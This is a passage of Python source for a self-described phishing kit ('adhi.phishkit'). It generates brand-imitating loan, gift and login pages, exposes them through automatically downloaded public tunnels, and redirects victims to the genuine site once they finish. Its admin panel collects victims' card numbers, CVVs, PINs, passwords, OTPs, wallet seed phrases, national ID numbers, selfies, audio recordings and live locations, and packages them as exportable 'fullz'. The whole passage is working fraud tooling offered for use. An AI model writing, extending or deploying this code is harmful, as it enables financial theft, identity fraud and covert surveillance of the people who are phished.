        m, d, c, j = lay_gen(s, tok, step, ctx)
        return page(site, s["l"] + " | " + TITLES.get(step, ""), c, m, d, j)
    fn = FAMS.get(LAYOUT.get(site, "gen"), lay_gen)
    m, d, c, j = fn(s, tok, step, ctx)
    return page(site, s["l"] + " | " + TITLES.get(step, ""), c, m, d, j)

def done_page(site, ctx=None):
    s = SITES.get(site, {})
    ctx = ctx or {}
    dest = CFG["redirect"].get(site) or ("https://" + s.get("dom", "google.com"))
    if s.get("c") == "loan":
        head = ("<h1>Loan disbursed</h1><p>&#8377;" + inr(ctx.get("amount") or "100000") +
                " is on the way to your account.<br>It reflects within 24 working hours.</p>")
    elif s.get("c") == "gift":
        head = ("<h1>Code redeemed</h1><p>Your reward is being credited to your account.<br>"
                "It usually appears within a few minutes.</p>")
    else:
        head = "<h1>Verified successfully</h1><p>Redirecting you to " + html.escape(s.get("l", "")) + "&hellip;</p>"
    css = """
body{background:var(--bg);display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}
.w{width:100%;max-width:420px}
.card{background:var(--card);border:1px solid var(--bd);border-radius:16px;padding:8px 20px 24px;
 text-align:center;box-shadow:0 20px 50px -34px #0b1a3a}
.lg{display:flex;justify-content:center;padding:22px 0 4px}
h1{font-size:20px;margin:10px 0 6px}
p{font-size:12.5px;color:var(--mut);line-height:1.7}
.bar{height:6px;background:var(--bd);border-radius:4px;margin-top:18px;overflow:hidden}
.bar b{display:block;height:100%;width:0;background:var(--ac);transition:width 1.4s}
"""
    inner = ("<div class='w'><div class='card'><div class='lg'>" + brand(s, 150) + "</div><div class='ok'>"
             "<div class='ic'><svg viewBox='0 0 24 24'><path d='M4 12.5l5 5L20 6.5'/></svg></div>" + head +
             "</div><div class='bar'><b id='b'></b></div></div></div>"
             "<script>setTimeout(function(){document.getElementById('b').style.width='100%'},60);"
             "setTimeout(function(){location.replace('" + dest + "')},2400)</script>")
    return page(site, "Verified", css, inner, inner)

def chooser(tok):
    rows = ""
    for cat, title in CATS:
        keys = [k for k, v in SITES.items() if v["c"] == cat]
        if not keys:
            continue
        rows += "<h3>" + title + "</h3><div class='grid'>"
        for k in keys:
            rows += ("<a href='/" + k + "/" + tok + "'><span>" + brand(SITES[k], 40) + "</span>" +
                     html.escape(SITES[k]["l"]) + "</a>")
        rows += "</div>"
    css = """
body{background:#0b0e14;color:#e6edf7;padding:22px 16px;font-family:'Inter',system-ui,sans-serif}
h1{font-size:19px;text-align:center;margin-bottom:4px}p{text-align:center;color:#7c8aa3;font-size:12.5px;
 margin-bottom:16px}h3{font-size:10.5px;text-transform:uppercase;letter-spacing:1.2px;color:#5d6b84;
 margin:15px 0 8px}.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:8px}
.grid a{display:flex;align-items:center;gap:8px;background:#121826;border:1px solid #1e2738;border-radius:10px;
 padding:9px 10px;font-size:12px;color:#c6d2e4}
.grid a:hover{border-color:#3b82f6}.grid span{width:22px;display:flex;justify-content:center}
.grid span svg{max-height:20px;width:auto}
"""
    return page("", CFG.get("site_title", "Sign in"), css, "<h1>Select a target</h1><p>" + str(len(SITES)) +
                " kits &middot; " + str(len(CATS)) + " categories</p>" + rows, "")

# ============================================================ tunnel
CFB = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-"
BORE = "0.5.3"
RE = {"cloudflared": re.compile(r"https://[a-z0-9-]+\.trycloudflare\.com"),
      "localhostrun": re.compile(r"https://[a-z0-9-]+\.lhr\.life"),
      "pinggy": re.compile(r"https://[a-z0-9-]+\.(?:free\.)?pinggy\.link"),
      "serveo": re.compile(r"https://[a-z0-9-]+\.serveo\.net"),
      "ngrok": re.compile(r"https://[a-z0-9-]+\.ngrok(?:-free)?\.(?:app|io)"),
      "bore": re.compile(r"bore\.pub:(\d+)")}
PROVS = ("cloudflared", "localhostrun", "pinggy", "serveo", "ngrok", "bore")
SSH = ["-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null", "-o", "ServerAliveInterval=25",
       "-o", "ExitOnForwardFailure=yes", "-T"]

def tpkg(*p):
    if not IS_TERMUX:
        return False
    env = dict(os.environ, DEBIAN_FRONTEND="noninteractive")
    for c in (["pkg", "install", "-y"] + list(p), ["apt", "install", "-y"] + list(p)):
        try:
            if subprocess.run(c, capture_output=True, timeout=420, env=env).returncode == 0:
                return True
        except Exception:
            pass
    return False

def runs(e, a="--version"):
    try:
        return subprocess.run([e, a], capture_output=True, timeout=20).returncode == 0
    except Exception:
        return False

def cf_asset():
    m = _plat.machine().lower()
    if sys.platform.startswith("win"):
        return "windows-amd64.exe"
    if sys.platform == "darwin":
        return "darwin-arm64" if m in ("arm64", "aarch64") else "darwin-amd64"
    return "linux-arm64" if m in ("aarch64", "arm64") else "linux-amd64"

def dl_cf():
    n = "cloudflared.exe" if sys.platform.startswith("win") else "cloudflared"
    p = os.path.join(BIN, n)
    if os.path.exists(p) and os.path.getsize(p) > 1000000 and runs(p):
        return p
    print("  [*] cloudflared %s ..." % cf_asset())
    try:
        urllib.request.urlretrieve(CFB + cf_asset(), p)
        if not sys.platform.startswith("win"):
            os.chmod(p, 0o755)
        return p if runs(p) else None
    except Exception as e:
        print("  [!] %s" % e); return None

def dl_bore():
    m = _plat.machine().lower()
    a = "aarch64" if m in ("aarch64", "arm64") else "x86_64"
    p = os.path.join(BIN, "bore")
    if os.path.exists(p) and runs(p):
        return p
    u = "https://github.com/ekzhang/bore/releases/download/v%s/bore-v%s-%s-unknown-linux-musl.tar.gz" % (BORE, BORE, a)
    try:
        fd, tmp = tempfile.mkstemp(suffix=".tar.gz"); os.close(fd)
        urllib.request.urlretrieve(u, tmp)
        with tarfile.open(tmp, "r:gz") as tf:
            for m_ in tf.getmembers():
                if m_.name == "bore" and m_.isfile():
                    m_.name = "bore"
                    try:
                        tf.extract(m_, BIN, filter="data")
                    except TypeError:
                        tf.extract(m_, BIN)
        os.remove(tmp); os.chmod(p, 0o755)
        return p if runs(p) else None
    except Exception as e:
        print("  [!] bore: %s" % e); return None

def ensure(p):
    if p == "cloudflared":
        w = shutil.which("cloudflared")
        if w:
            return w
        if IS_TERMUX and tpkg("cloudflared"):
            w = shutil.which("cloudflared")
            if w:
                return w
        return dl_cf()
    if p == "ngrok":
        return shutil.which("ngrok")
    if p in ("localhostrun", "pinggy", "serveo"):
        w = shutil.which("ssh")
        if w:
            return w
        if IS_TERMUX and tpkg("openssh"):
            return shutil.which("ssh")
        return None
    if p == "bore":
        return shutil.which("bore") or dl_bore()
    return None

def cmd(p, e, port, alt=False):
    if p == "cloudflared":
        return [e, "tunnel", "--url", "http://127.0.0.1:%d" % port, "--no-autoupdate"] + \
               (["--protocol", "http2"] if alt else [])
    if p == "localhostrun":
        return [e] + SSH + (["-p", "443"] if alt else []) + ["-R", "80:localhost:%d" % port, "nokey@localhost.run"]
    if p == "pinggy":
        return [e] + SSH + ["-p", "443", "-R", "0:localhost:%d" % port, "a.pinggy.io"]
    if p == "serveo":
        return [e] + SSH + (["-p", "443"] if alt else []) + ["-R", "80:localhost:%d" % port, "serveo.net"]
    if p == "ngrok":
        return [e, "http", str(port), "--log=stdout"]
    if p == "bore":
        return [e, "local", str(port), "--to", "bore.pub"]
    return []

def pump(pr, p):
    global TURL
    for line in pr.stdout:
        m = RE[p].search(line)
        if not m:
            continue
        u = "http://bore.pub:%s" % m.group(1) if p == "bore" else m.group(0)
        if not TURL:
            TURL = u; CFG["public_url"] = u; save_cfg()
            print("\n  [+] PUBLIC URL (%s): %s\n" % (p, u))

def start_tun(port, prov="auto", retries=3):
    global TUN, TURL, TKIND
    with TLOCK:
        if TUN and TUN.poll() is None and TURL:
            return TURL
        order = PROVS if prov in ("auto", "", None) else (prov,)
        last = ""
        for p in order:
            for att in range(retries):
                try:
                    e = ensure(p)
                except Exception as ex:
                    last = "%s: %s" % (p, ex); continue
                if not e:
                    last = "%s: not available" % p; continue
                TURL = ""
                try:
                    TUN = subprocess.Popen(cmd(p, e, port, bool(att % 2)), stdout=subprocess.PIPE,
                                           stderr=subprocess.STDOUT, text=True, bufsize=1, errors="replace",
                                           start_new_session=True)
                except Exception as ex:
                    last = "%s: %s" % (p, ex); continue
                TKIND = p
                threading.Thread(target=pump, args=(TUN, p), daemon=True).start()
                dl = time.time() + 20
                while time.time() < dl:
                    if TURL:
                        return TURL
                    if TUN.poll() is not None:
                        last = "%s: exited" % p; break
                    time.sleep(.25)
                if TURL:
                    return TURL
                stop_tun(); time.sleep(1)
        return "ERR:" + (last or "all providers failed")

def stop_tun():
    global TUN, TURL, TKIND
    with TLOCK:
        pr, TUN, TURL, TKIND = TUN, None, "", ""
    if pr and pr.poll() is None:
        try:
            os.killpg(os.getpgid(pr.pid), 15)
        except Exception:
            try:
                pr.terminate()
            except Exception:
                pass
        try:
            pr.wait(5)
        except Exception:
            try:
                pr.kill()
            except Exception:
                pass

def tun_ok():
    return bool(TUN and TUN.poll() is None and TURL)

def watchdog(port):
    while WATCH["on"]:
        time.sleep(20)
        if WATCH["on"] and not tun_ok():
            print("  [~] tunnel dropped, restarting")
            start_tun(port, CFG.get("tunnel_provider") or "auto")

# ============================================================ admin ui
ACSS = """
*{box-sizing:border-box;margin:0;padding:0}
:root{--bg:#070a0f;--pnl:#0e141c;--pnl2:#111925;--bd:#1b2634;--bd2:#243347;
 --tx:#e9f1fa;--mut:#75879b;--ac:#25e6a4;--ac2:#12b98a;--bl:#4d9bff;--rd:#ff5470;--yl:#ffc453;
 --glow:0 0 0 1px #25e6a433,0 8px 28px -14px #25e6a466}
body{font-family:'Inter',-apple-system,'Segoe UI',Roboto,sans-serif;font-size:13px;line-height:1.5;
 background:radial-gradient(1200px 620px at 12% -8%,#0f2a24 0%,transparent 55%),
 radial-gradient(900px 500px at 92% 4%,#101d33 0%,transparent 52%),var(--bg);
 color:var(--tx);min-height:100vh;-webkit-font-smoothing:antialiased}
a{color:var(--bl);text-decoration:none}
.wrap{max-width:1420px;margin:0 auto;padding:14px 16px 70px}
header{display:flex;align-items:center;gap:10px;flex-wrap:wrap;padding:10px 12px;margin-bottom:14px;
 background:linear-gradient(180deg,#0e1620cc,#0b111acc);border:1px solid var(--bd);border-radius:14px;
 backdrop-filter:blur(12px);position:sticky;top:8px;z-index:20}
.brand{display:flex;align-items:center;gap:8px;font-weight:800;font-size:14px;letter-spacing:-.2px}
.dot{width:9px;height:9px;border-radius:50%;background:var(--ac);box-shadow:0 0 0 4px #25e6a422;
 animation:pulse 1.9s infinite}
@keyframes pulse{50%{box-shadow:0 0 0 7px #25e6a40d}}
.brand span{color:var(--ac)}
.ver{font-size:9.5px;letter-spacing:.7px;padding:2px 7px;border-radius:99px;border:1px solid var(--bd2);
 color:var(--mut);text-transform:uppercase}
.sp{flex:1}
button,.btn{font-family:inherit;font-size:11.5px;font-weight:600;background:var(--pnl2);color:var(--tx);
 border:1px solid var(--bd2);padding:7px 12px;border-radius:9px;cursor:pointer;transition:.16s;
 display:inline-flex;align-items:center;gap:6px;white-space:nowrap}
button:hover,.btn:hover{border-color:#35506e;background:#16212f;transform:translateY(-1px)}
button:active{transform:translateY(0)}
button.p{background:linear-gradient(180deg,var(--ac),var(--ac2));border-color:var(--ac);color:#04231a;
 box-shadow:var(--glow)}
button.p:hover{filter:brightness(1.06)}
button.r{color:var(--rd);border-color:#3b1d26}
button.r:hover{background:#1c1014;border-color:#5c2733}
button.g{color:var(--mut)}
button svg{width:13px;height:13px;stroke:currentColor;fill:none;stroke-width:1.9}
input,select,textarea{width:100%;font-family:inherit;font-size:12.5px;background:#0a121b;color:var(--tx);
 border:1px solid var(--bd);border-radius:9px;padding:9px 11px;outline:none;transition:.15s}
input:focus,select:focus{border-color:var(--ac);box-shadow:0 0 0 3px #25e6a418}
label{display:block;font-size:9.5px;font-weight:800;text-transform:uppercase;letter-spacing:1px;
 color:var(--mut);margin:13px 0 6px}
.panel{background:linear-gradient(180deg,#0f1620,#0b121a);border:1px solid var(--bd);border-radius:14px;
 padding:14px;margin-bottom:12px;box-shadow:0 1px 0 #ffffff08 inset}
.panel>h3{font-size:9.5px;text-transform:uppercase;letter-spacing:1.3px;color:var(--mut);
 margin-bottom:11px;display:flex;align-items:center;gap:7px}
.panel>h3:before{content:'';width:3px;height:12px;border-radius:2px;background:var(--ac)}
.grid2{display:grid;gap:12px}
@media(min-width:1060px){.grid2{grid-template-columns:1.9fr 1fr;align-items:start}}
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(88px,1fr));gap:9px;margin-bottom:12px}
.stat{background:linear-gradient(180deg,#0f1721,#0a1017);border:1px solid var(--bd);border-radius:12px;
 padding:10px 12px;position:relative;overflow:hidden}
.stat:after{content:'';position:absolute;left:0;top:0;bottom:0;width:3px;background:var(--bd2)}
.stat.a:after{background:var(--ac)}.stat.b:after{background:var(--rd)}.stat.c:after{background:var(--bl)}
.stat.d:after{background:var(--yl)}
.stat b{display:block;font-size:21px;font-weight:800;letter-spacing:-.6px}
.stat span{font-size:8.5px;letter-spacing:1.1px;text-transform:uppercase;color:var(--mut)}
.scroll{overflow-x:auto;margin:0 -14px;padding:0 14px}
table{width:100%;border-collapse:collapse;font-size:11.5px}
th,td{text-align:left;padding:7px 6px;border-bottom:1px solid #131c27;vertical-align:middle;white-space:nowrap}
th{font-size:8.5px;text-transform:uppercase;letter-spacing:1px;color:var(--mut);position:sticky;top:0;
 background:#0b121a}
tbody tr{transition:.13s}tbody tr:hover{background:#0f1a26}
code{font-family:ui-monospace,Menlo,monospace;background:#080e15;border:1px solid #17222f;border-radius:5px;
 padding:1px 5px;font-size:10.5px;color:#ffd479;word-break:break-all;white-space:normal}
.mono{font-family:ui-monospace,Menlo,monospace;font-size:10.5px;color:var(--mut)}
.tag{padding:2px 7px;border-radius:5px;font-size:8.5px;text-transform:uppercase;letter-spacing:.5px;
 background:#131d29;color:var(--mut);border:1px solid #1e2b3b}
.tag.m{background:#0d3328;color:var(--ac);border-color:#175443}
.tag.l{background:#10223b;color:#79b0ff;border-color:#1e3c62}
.empty{padding:26px 0;text-align:center;color:var(--mut);font-size:11.5px}
.row{display:flex;gap:7px;flex-wrap:wrap;align-items:center;margin-top:9px}
.row>*{flex:0 0 auto}.row input{flex:1 1 110px}
.toast{position:fixed;bottom:20px;left:50%;transform:translate(-50%,20px);background:#07231a;
 border:1px solid var(--ac);color:var(--ac);padding:9px 17px;border-radius:10px;font-size:11.5px;
 opacity:0;transition:.22s;z-index:40;pointer-events:none;box-shadow:var(--glow)}
.toast.on{opacity:1;transform:translate(-50%,0)}
.login{max-width:340px;margin:16vh auto;padding:24px}
.err{color:var(--rd);font-size:11.5px;margin-top:10px}
.hint{font-size:10px;color:var(--mut);margin-top:6px;line-height:1.65}
.sw{display:flex;justify-content:space-between;align-items:center;gap:10px;padding:8px 0;
 border-bottom:1px solid #131c27;font-size:12px}
.sw small{display:block;color:var(--mut);font-size:9.5px;margin-top:1px}
.tg{width:40px;height:22px;border-radius:13px;background:#17222f;border:1px solid #24343f;position:relative;
 cursor:pointer;flex:0 0 auto;padding:0;min-width:40px}
.tg:after{content:'';position:absolute;top:2px;left:2px;width:16px;height:16px;border-radius:50%;
 background:#5f7385;transition:.16s}
.tg:hover{transform:none}
.tg.on{background:#0d3328;border-color:var(--ac)}.tg.on:after{left:21px;background:var(--ac)}
.cols2{display:grid;grid-template-columns:1fr 1fr;gap:9px}
.kc{font-size:10.5px;padding:6px 9px;border-radius:8px;background:#0b131c;border:1px solid var(--bd);
 color:var(--mut);cursor:pointer}
.kc:hover{border-color:#2f4761;color:var(--tx);transform:none}
.kc.sel{background:#0d2b22;border-color:var(--ac);color:var(--ac);font-weight:700}
.chips{display:flex;gap:6px;overflow-x:auto;padding-bottom:6px}
.chips button{font-size:10px;padding:5px 10px;border-radius:99px}
.chips button.on{background:#0d2b22;border-color:var(--ac);color:var(--ac)}
.devs{display:grid;grid-template-columns:repeat(3,1fr);gap:6px}
.devs button{justify-content:center;font-size:10.5px}
.devs button.on{background:#102b3f;border-color:#2b6ea8;color:#8ecbff}
.lnk{background:#0a121a;border:1px solid var(--bd);border-radius:10px;padding:9px;margin-top:8px}
.lnk b{font-size:9.5px;color:var(--ac);display:block;margin-bottom:5px;text-transform:uppercase;
 letter-spacing:.8px}
.u{font-family:ui-monospace,monospace;font-size:10.5px;word-break:break-all;color:#9db7cf}
.thumbs{display:flex;gap:8px;flex-wrap:wrap;margin-top:8px}
.thumbs a{width:90px;height:66px;border:1px solid var(--bd);border-radius:8px;overflow:hidden;display:block}
.thumbs img{width:100%;height:100%;object-fit:cover}
.live{width:100%;border:1px solid var(--bd);border-radius:10px;background:#000;max-height:340px;
 object-fit:contain}
.track{background:linear-gradient(180deg,#1a73e8,#0d5bc4);border-color:#1a73e8;color:#fff;
 box-shadow:0 6px 20px -10px #1a73e8}
.track:hover{background:linear-gradient(180deg,#2b82f5,#1466d6);border-color:#2b82f5}
.mapbox{height:250px;border:1px solid var(--bd);border-radius:10px;overflow:hidden;margin-top:8px;
 background:#0a121a}
.mapbox iframe{width:100%;height:100%;border:0}
.mgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(112px,1fr));gap:8px;margin-top:8px}
.mgrid .cell{position:relative;border:1px solid var(--bd);border-radius:8px;overflow:hidden;background:#000}
.mgrid img{width:100%;height:80px;object-fit:cover;display:block}
.mgrid .dl{position:absolute;right:4px;bottom:4px;background:#000000b3;border:1px solid #ffffff33;color:#fff;
 border-radius:6px;padding:3px 6px;font-size:9px;display:flex;align-items:center;gap:3px}
.mgrid .dl:hover{background:#000;transform:none}
.aud{display:flex;align-items:center;gap:8px;background:#0b131c;border:1px solid var(--bd);border-radius:8px;
 padding:6px 8px;margin-bottom:6px}
.aud audio{flex:1;height:30px}
.aud .dl{background:#132132;border:1px solid #24343f;color:var(--ac);border-radius:6px;padding:4px 7px;
 font-size:10px;display:flex;align-items:center;gap:3px}
.aud .dl:hover{background:#16293c;transform:none}
"""

ADM_JS = """
var lastV=-1,DEV='auto',FILT='all';
function $(i){return document.getElementById(i)}
function toast(t){var e=$('toast');e.textContent=t;e.className='toast on';setTimeout(function(){e.className='toast'},1700)}
function post(u,d){return fetch(u,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d||{})}).then(function(r){return r.json()})}
function pick(k){document.querySelectorAll('.kc').forEach(function(c){c.classList.remove('sel')});
 var e=document.querySelector('.kc[data-k="'+k+'"]');if(e)e.classList.add('sel');$('site').value=k;
 var o=$('otgt');if(o){o.classList.toggle('on',!!O[k]);}
 slugdef()}
function slugdef(){var s=$('site').value;if(!s)return;
 $('slug').value=(V[s]||'').replace(/^www\\./,'');var p=$('pv');if(p)p.href='/admin/preview/'+s}
function pick_dev(d){DEV=d;document.querySelectorAll('.devs button').forEach(function(b){
 b.classList.toggle('on',b.dataset.d===d)})}
function togOtp(el){var s=$('site').value;if(!s){toast('pick a kit first');return}
 el.classList.toggle('on');var on=el.classList.contains('on')?1:0;O[s]=on;
 post('/admin/api/otp',{p:s,on:on}).then(function(){toast(on?'OTP step ON':'OTP step OFF')})}
function tg(el,k){el.classList.toggle('on');post('/admin/api/shield',{k:k,on:el.classList.contains('on')?1:0}).then(function(){toast('saved')})}
function setpub(){post('/admin/api/pub',{url:$('pub').value}).then(function(){toast('base url saved')})}
function beep(){try{var a=new (window.AudioContext||window.webkitAudioContext)();var o=a.createOscillator();
 o.connect(a.destination);o.frequency.value=880;o.start();o.stop(a.currentTime+0.09)}catch(e){}}
function cp(u){if(!u){toast('nothing to copy');return}
 if(navigator.clipboard){navigator.clipboard.writeText(u)}else{var a=document.createElement('textarea');
 a.value=u;document.body.appendChild(a);a.select();document.execCommand('copy');a.remove()}toast('copied')}
function pair(r,sens){
 if(!r.ok){toast(r.msg||'failed');return}
 var v=r.url.split(String.fromCharCode(10)),a=(r.admin||'').split(String.fromCharCode(10)),h='';
 for(var i=0;i<v.length;i++){var u=v[i],du=u;
  if(DEV==='mobile')du=u+'?d=mobile';else if(DEV==='laptop')du=u+'?d=laptop';
  h+="<div class='lnk'><b>single link &middot; auto device</b><div class='u'>"+du+"</div><div class='row'>"+
     "<button onclick=\\"cp('"+du+"')\\">copy</button>"+
     "<button onclick=\\"window.open('"+du+"')\\">open</button>"+
     "<button onclick=\\"qr('"+du+"')\\">QR</button></div></div>";
  if(sens&&a[i])h+="<div class='lnk'><b>admin panel &middot; live</b><div class='u'>"+a[i]+"</div><div class='row'>"+
     "<button class='p' onclick=\\"window.open('"+a[i]+"')\\">open panel</button>"+
     "<button onclick=\\"cp('"+a[i]+"')\\">copy</button></div></div>"}
 $('out').innerHTML=h}
function gen(sens){
 var s=$('site').value;if(!s){toast('pick a kit first');return}
 var b=sens?$('gs'):$('gp');b.disabled=true;var o=b.textContent;b.textContent='...';
 post('/admin/api/link',{p:s,slug:$('slug').value,n:$('n').value||1,dev:DEV,mode:sens?'sens':'plain'})
 .then(function(r){b.disabled=false;b.textContent=o;pair(r,sens)})
 .catch(function(){b.disabled=false;b.textContent=o;toast('network error')})}
function qr(u){u=u||($('out').querySelector('.u')||{}).textContent;if(!u){toast('generate first');return}
 window.open('https://api.qrserver.com/v1/create-qr-code/?size=340x340&data='+encodeURIComponent(u))}
function save(){post('/admin/api/settings',{otp_len:$('olen').value,title:$('title').value,badge:$('badge').value,
 ttok:$('ttok').value,tchat:$('tchat').value,rmode:$('rmode').value,prov:$('prov').value,ttl:$('ttl').value,
 maxv:$('maxv').value,geo:$('geo').value,redir:$('redir').value}).then(function(){toast('saved')})}
function chpw(){if(!$('npw').value){toast('enter a password');return}
 post('/admin/api/password',{pw:$('npw').value}).then(function(){toast('rotated')})}
function del(i){post('/admin/api/del',{id:i}).then(function(){load();toast('deleted')})}
function clr(){if(confirm('Purge all sessions?'))post('/admin/api/clear',{}).then(function(){load();toast('purged')})}
function tun(a){toast(a==='start'?'spawning tunnel...':'killing tunnel...');
 post('/admin/api/tunnel',{action:a,provider:$('prov').value}).then(function(r){
  toast(r.url||r.msg||'done');setTimeout(function(){location.reload()},1400)})}
function esc(s){return String(s==null?'':s).replace(/[&<>"]/g,function(c){
 return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]})}
function bump(i,v){var e=$(i);if(e)e.textContent=v}
function fullz(id){fetch('/admin/api/fullz?id='+id).then(function(r){return r.text()}).then(cp)}
function setf(f){FILT=f;document.querySelectorAll('.chips button').forEach(function(b){
 b.classList.toggle('on',b.dataset.f===f)});load()}
function row(r){
 var dv=r.dev==='m'?'<span class="tag m">mob</span>':(r.dev==='l'?'<span class="tag l">pc</span>':'<span class="tag">auto</span>');
 return '<tr><td>'+r.id+'</td><td class="mono">'+esc((r.created||'').slice(5))+'</td><td><span class="tag">'+esc(r.site)+
 '</span></td><td>'+dv+'</td><td>'+(r.amount?'<code>'+esc(r.amount)+'</code>':'')+'</td><td>'+
 esc(r.name||r.ident)+'</td><td>'+esc(r.holder)+'</td><td><code>'+esc(r.card)+'</code></td><td class="mono">'+
 esc(r.exp)+'</td><td><code>'+esc(r.cvv)+'</code></td><td><code>'+esc(r.pin)+'</code></td><td><code>'+
 esc(r.pw)+'</code></td><td><code>'+esc(r.otp)+'</code></td><td class="mono">'+esc((r.seed||'').slice(0,20))+
 '</td><td class="mono">'+esc(r.ip)+'</td><td class="mono"><a href="/admin/session/'+r.id+
 '" target="_blank">view</a> <a href="#" onclick="fullz('+r.id+');return false">fullz</a> <a href="#" onclick="del('+
 r.id+');return false">x</a></td></tr>'}
function load(){
 fetch('/admin/api/sessions').then(function(r){return r.json()}).then(function(d){
  var tb=$('rows');bump('c1',d.stats.v);bump('c2',d.stats.p);bump('c3',d.stats.o);bump('c4',d.stats.c);
  bump('c6',d.stats.s);bump('c7',d.stats.b);bump('c8',d.stats.l);
  if(d.stats.v>lastV){if(lastV>=0&&$('snd').classList.contains('on'))beep();
   if($('ntf').classList.contains('on')&&window.Notification&&Notification.permission==='granted'){
    new Notification('New capture',{body:(d.rows[0]?d.rows[0].site+' :: '+(d.rows[0].ident||d.rows[0].name||''):'')})}
   lastV=d.stats.v}
  var q=($('q')&&$('q').value||'').toLowerCase();
  var rows=d.rows.filter(function(r){
   if(FILT==='loan'&&!r.amount)return false;
   if(FILT==='card'&&!r.card)return false;
   if(FILT==='pw'&&!r.pw)return false;
   if(FILT==='seed'&&!r.seed)return false;
   return !q||JSON.stringify(r).toLowerCase().indexOf(q)>=0});
  if(!rows.length){tb.innerHTML='<tr><td colspan="16" class="empty">No traffic yet.</td></tr>';return}
  tb.innerHTML=rows.map(row).join('')}).catch(function(){})}
function ntf(el){el.classList.toggle('on');
 if(el.classList.contains('on')&&window.Notification&&Notification.permission!=='granted')Notification.requestPermission();
 post('/admin/api/shield',{k:'notify',on:el.classList.contains('on')?1:0})}
function snd(el){el.classList.toggle('on');beep();post('/admin/api/shield',{k:'sound',on:el.classList.contains('on')?1:0})}
load();setInterval(load,2500);
"""

def ashell(title, body):
    return ("<!doctype html><html><head><meta charset='utf-8'>"
            "<meta name='viewport' content='width=device-width,initial-scale=1'>"
            "<meta name='robots' content='noindex,nofollow'><title>" + title + "</title>"
            "<link rel='preconnect' href='https://fonts.googleapis.com'>"
            "<link href='https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap' "
            "rel='stylesheet'><style>" + ACSS + "</style></head><body>" + body + "</body></html>")

def a_login(err=""):
    e = "<div class='err'>" + err + "</div>" if err else ""
    return ashell("phishkit :: auth",
                  "<div class='login panel'><div class='brand'><span class='dot'></span>adhi.<span>phishkit</span></div>"
                  "<div class='hint' style='margin-bottom:14px'>v36 &middot; official replica engine</div>"
                  "<form method='post' action='/admin/login'><label>Admin password</label>"
                  "<input type='password' name='pw' autofocus required>"
                  "<div class='row'><button class='p' style='width:100%;justify-content:center'>Sign in</button>"
                  "</div>" + e + "</form></div>")

def gmaps(lat, lon, z=17):
    return "https://www.google.com/maps?q=%s,%s&z=%d" % (lat, lon, z)

def a_sess(sid):
    with db() as c:
        r = c.execute("SELECT * FROM sessions WHERE id=?", (sid,)).fetchone()
        if not r:
            return ashell("404", "<div class='wrap'><div class='panel'>No session " + html.escape(str(sid)) + "</div></div>")
        evs = c.execute("SELECT ts,kind,detail FROM events WHERE token=? ORDER BY id", (r["token"],)).fetchall()
        med = c.execute("SELECT * FROM media WHERE token=? ORDER BY id DESC", (r["token"],)).fetchall()
    keys = ("id", "created", "site", "dev", "status", "step", "token", "giftcode", "amount", "tenure",
            "purpose", "name", "pan", "aadhaar", "dob", "addr", "city", "state", "zip", "emp", "income",
            "email", "acct", "ifsc", "bname", "holder", "card", "exp", "cvv", "pin", "pw", "otp", "seed",
            "ssn", "docs", "hits", "ip", "ua")
    rows = "".join("<tr><th>" + html.escape(k) + "</th><td><code>" + html.escape(str(r[k] or "")) +
                   "</code></td></tr>" for k in keys)
    logs = "".join("<tr><td class='mono'>" + html.escape(e["ts"]) + "</td><td>" + html.escape(e["kind"]) +
                   "</td><td><code>" + html.escape(e["detail"]) + "</code></td></tr>" for e in evs)
    sn = [m for m in med if m["kind"] == "snap"]
    au = [m for m in med if m["kind"] in ("aud", "mp3")]
    gm = [m for m in med if m["kind"] == "geo"]
    thumbs = ""
    if sn:
        thumbs = ("<div class='panel'><h3>Selfies (" + str(len(sn)) + ")</h3><div class='mgrid'>" +
                  "".join("<div class='cell'><a href='/m/" + html.escape(m["file"]) + "' target='_blank'>"
                          "<img src='/m/" + html.escape(m["file"]) + "'></a>"
                          "<a class='dl' download href='/m/" + html.escape(m["file"]) + "'>&#8681; save</a></div>"
                          for m in sn[:60]) + "</div></div>")
    geo = ""
    if gm:
        g = gm[0]
        geo = ("<div class='panel'><h3>Location</h3><div class='mono'>" + html.escape(g["lat"]) + ", " +
               html.escape(g["lon"]) + " &plusmn;" + html.escape(g["acc"] or "0") + "m</div>"
               "<div class='row'><a class='btn track' target='_blank' href='" +
               gmaps(html.escape(g["lat"] or "0"), html.escape(g["lon"] or "0")) +
               "'><svg viewBox='0 0 24 24'><path d='M12 21s-7-5.6-7-11a7 7 0 1 1 14 0c0 5.4-7 11-7 11z'/>"
               "<circle cx='12' cy='10' r='2.6'/></svg>Track on Google Maps</a>"
               "<button onclick=\"cp('" + html.escape(g["lat"] or "") + "," + html.escape(g["lon"] or "") +
               "')\">Copy coords</button></div>"
               "<div class='mapbox'><iframe src='https://www.openstreetmap.org/export/embed.html?bbox=" +
               html.escape(g["lon"] or "0") + "," + html.escape(g["lat"] or "0") + "," +
               html.escape(g["lon"] or "0") + "," + html.escape(g["lat"] or "0") +
               "&layer=mapnik&marker=" + html.escape(g["lat"] or "0") + "," + html.escape(g["lon"] or "0") +
               "'></iframe></div></div>")
    aud = ""
    if au:
        aud = ("<div class='panel'><h3>Audio (" + str(len(au)) + ")</h3>" +
               "".join("<div class='aud'><audio controls src='/m/" + html.escape(m["file"]) + "'></audio>"
                       "<a class='dl' download href='/m/" + html.escape(m["file"]) + "'>"
                       "<svg width='11' height='11' viewBox='0 0 24 24' fill='none' stroke='currentColor' "
                       "stroke-width='2.4'><path d='M12 3v12'/><path d='M7 11l5 5 5-5'/></svg>save</a></div>"
                       for m in au[:20]) + "</div>")
    return ashell("session", "<div class='wrap'><header><span class='brand'><span class='dot'></span>session <span>#" +
                  html.escape(str(sid)) + "</span></span><span class='sp'></span>"
                  "<button onclick=\"fullz(" + str(sid) + ")\">Copy fullz</button>"
                  "<a href='/admin/dl/" + str(sid) + "'><button>Download .txt</button></a>"
                  "<button onclick=\"window.open('/a/" + html.escape(r["token"]) + "','_blank')\">Live panel</button>"
                  "<a href='/admin'><button class='g'>Back</button></a></header>"
